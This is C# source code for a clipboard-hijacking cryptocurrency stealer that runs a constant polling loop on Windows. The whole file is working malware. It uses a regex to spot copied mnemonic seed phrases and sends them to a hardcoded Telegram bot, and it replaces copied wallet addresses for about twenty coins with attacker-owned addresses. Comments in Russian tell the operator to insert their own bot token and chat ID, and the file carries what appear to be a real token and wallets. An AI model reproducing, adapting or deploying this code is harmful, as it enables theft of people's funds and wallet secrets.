using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using NBitcoin;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace kepc2;

internal static class Program
{
    private static readonly List<Wallet> Wallets = new()
    {
        #region BTC

        new Wallet
        {
            Address = "3BjRNQCub8H5FQxfi6mpWSGj5t9kYWYUdE",
            Regex = new Regex("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "1MAijzBid88QTw7q7RZm71TP84oAuAGAni",
            Regex = new Regex("^1[a-km-zA-HJ-NP-Z1-9]{25,34}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "bc1qrwljms3hkqcwjr7q5h8l2e0agj9ca91a6ykmgq",
            Regex = new Regex("^bc1[a-zA-HJ-NP-Z0-9]{25,39}$", RegexOptions.Compiled)
        },

        #endregion

        new Wallet
        {
            Address = "0x51f9dbf8da18daf52824a56097c028ae7083b10c", // ETH
            Regex = new Regex("^0x[a-fA-F0-9]{40}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address =
                "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrpjHFg3cokCctwxcC", // XMR
            Regex = new Regex("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93,104}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "t1VkWbJs7diL8AMQf1ZtyZsxzRF7bZhRixt", // Zcash
            Regex = new Regex("^(t1|t3)[1-9A-HJ-NP-Za-km-z]{33}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "G2bK3D6pwZd7co6osiBBJfb5NfawadL1BNPssFf18qvR", // SOLANA
            Regex = new Regex("^[1-9A-HJ-NP-Za-km-z]{44}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "bnb1g6q07eckutpc32kkgke7w9y7j756hv0j8yy7zy", // BNB BEP-2
            Regex = new Regex("^bnb[a-z0-9]{39}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "rNUbNENVm3d2wUQF7DwHGFDHfwREBypMCf", // XRP
            Regex = new Regex("^r[1-9A-HJ-NP-Za-km-z]{24,34}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address =
                "addr1q92pkg3l3c2kkktfjzq5e7whn50ef9t5wkmk0jje3wmz2j65rv3rlrs4ddvknyypfnua08gljj2hgadhvl99nzaky49svct827", // ADA
            Regex = new Regex("^addr1[a-z0-9]{10,110}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "Ae2tdPwUPEZLz26GeqCkxQCXptcPU4xdSkgkiCEK4VUpd4Syb7mdXB8upUa", // ADA Byron
            Regex = new Regex("^(DdzFF|Ae2)[1-9A-HJ-NP-Za-km-z]{10,70}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "DPPWvX1x5fU9KhcRBZG2owZUGKAg7ybXwR", // DOGE
            Regex = new Regex("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "qqgsam4gve8e8lerq5fplcgmq2ak6n0epg5726vqvz", // Bitcoin cash (cashaddr)
            Regex = new Regex("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "cosmos1s0uha46qq0rem7dfdqsjth22af67nm8t9633p5", // Cosmos (ATOM)
            Regex = new Regex("^(cosmos1|osmo1)[a-z0-9]{38}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "GDBGAQTN5D5GDOFVQPDSK2PHZLLYUCQUCR3AWYQZRMCWHPV52PTR6XNQ", // Stellar (XLM)
            Regex = new Regex("^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$",
                RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "LZPJACUhtXNoRe2LDUobJK3Mcjr6uWfADV", // Litecoin Base58
            Regex = new Regex("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "ltc1quvy7swmnya6fs30lyfvpxmyvlat946jrlcnvhq", // Litecoin bech32
            Regex = new Regex("^ltc1[a-z0-9]{39,59}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "XpA3Yh9696irEVR6KV1pyxjY9fgmX176eJ", // Dash
            Regex = new Regex("^X[1-9A-HJ-NP-Za-km-z]{33}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "THXdHkvCPhVf6gv1hFpwxiCfw6BiXyfc5s", // Tron
            Regex = new Regex("^T[a-km-zA-HJ-NP-Z1-9]{33}$", RegexOptions.Compiled)
        },
        new Wallet
        {
            Address = "RTrqp6AfGhMSufT7HyBpi2sxTbZPppkpat", // Ronin
            Regex = new Regex("^R[a-km-zA-HJ-NP-Z1-9]{33}$", RegexOptions.Compiled)
        }
    };

    private static readonly ITelegramBotClient Client = new TelegramBotClient(BotToken);

    private static readonly List<string> MnemoHashes = new();

    private static readonly uint[] Lookup32Unsafe = CreateLookup32Unsafe();
    private static readonly Regex RegexSeed = new(@"([a-zA-Z]{3,15}\s?){12,24}", RegexOptions.Compiled);

    private static readonly unsafe uint* Lookup32UnsafeP =
        (uint*) GCHandle.Alloc(Lookup32Unsafe, GCHandleType.Pinned).AddrOfPinnedObject();

    private static uint[] CreateLookup32Unsafe()
    {
        var result = new uint[256];
        var flag = BitConverter.IsLittleEndian;
        for (var i = 0; i < 256; i++)
        {
            var s = i.ToString("X2");
            if (flag)
                result[i] = s[0] + ((uint) s[1] << 16);
            else
                result[i] = s[1] + ((uint) s[0] << 16);
        }

        return result;
    }

    private static unsafe string ByteArrayToHexViaLookup32Unsafe(in byte[] bytes)
    {
        var lookupP = Lookup32UnsafeP;
        var result = new char[bytes.Length * 2];
        fixed (byte* bytesP = bytes)
        fixed (char* resultP = result)
        {
            var resultP2 = (uint*) resultP;
            for (var i = 0; i < bytes.Length; i++) resultP2[i] = lookupP[bytesP[i]];
        }

        return string.Concat(result);
    }

    private static string GetHash(in byte[] bytes)
    {
        var crcTable = new uint[256];
        uint crc;

        for (uint i = 0; i < 256; i++)
        {
            crc = i;
            for (uint j = 0; j < 8; j++)
                crc = (crc & 1) != 0 ? (crc >> 1) ^ 0x8F6E37A0 : crc >> 1;

            crcTable[i] = crc;
        }

        crc = bytes.Aggregate(0xFFFFFFFF, (current, s) => crcTable[(current ^ s) & 0xFF] ^ (current >> 8));

        crc ^= 0xFFFFFFFF;
        return ByteArrayToHexViaLookup32Unsafe(BitConverter.GetBytes(crc));
    }

    [STAThread]
    private static void Main()
    {
        var hashes = new List<string>();
        var tempText = string.Empty;
        var i = 0;

        while (true)
        {
            var temp = Clipboard.GetText(TextDataFormat.UnicodeText);
            if (temp != tempText)
            {
                var hash = GetHash(Encoding.UTF8.GetBytes(temp));
                if (!hashes.Contains(hash))
                {
                    ClipboardChanged(temp);

                    hashes.Add(hash);
                    tempText = temp;
                }
            }

            Thread.Sleep(10);
            if (i == 10000) GC.Collect();
            i += 10;
        }
    }

    private static void ClipboardChanged(in string text)
    {
        if (text.Length < 5) return;
        var sended = 0;

        foreach (Match match in RegexSeed.Matches(text))
            try
            {
                var temp = match.Value.Trim(' ').Replace("\r", "").Replace("\n", "");
                var words = Wordlist.AutoDetect(match.Value).GetWords();
                var skip = temp.Split(' ').Any(x => words.Contains(x));
                if (!skip) continue;

                var hash = GetHash(Encoding.UTF8.GetBytes(temp));
                if (MnemoHashes.Contains(hash)) continue;

                Client.SendTextMessageAsync(YourId, $"Mnemonic detected!\n<code>{temp}</code>", ParseMode.Html)
                    .Start();
                sended++;

                MnemoHashes.Add(hash);
            }
            catch
            {
                // ignore
            }

        if (sended > 0) return;
        if (text.Length > 120) return;

        var tempText = text.Trim(' ').Replace("\r", "").Replace("\n", "");

        foreach (var wallet in Wallets.Where(wallet => wallet.Regex.IsMatch(tempText)))
        {
            Clipboard.SetText(wallet.Address);
            return;
        }
    }

    #region ForU

    /* !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! */
    private const string BotToken = "5080570161:AAHz1q3WXbHvzd8flVcLOXLcLcoB-nikJrE"; // ТОКЕН БОТА В TELEGRAM

    private static readonly ChatId
        YourId = new(938934199L); // ВАШ ID В TELGRAM с буквой 'L' на конце ИЛИ юзернейм в кавычках

    /* !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! */

    #endregion
}

internal struct Wallet
{
    internal string Address { get; set; }
    internal Regex Regex { get; set; }
}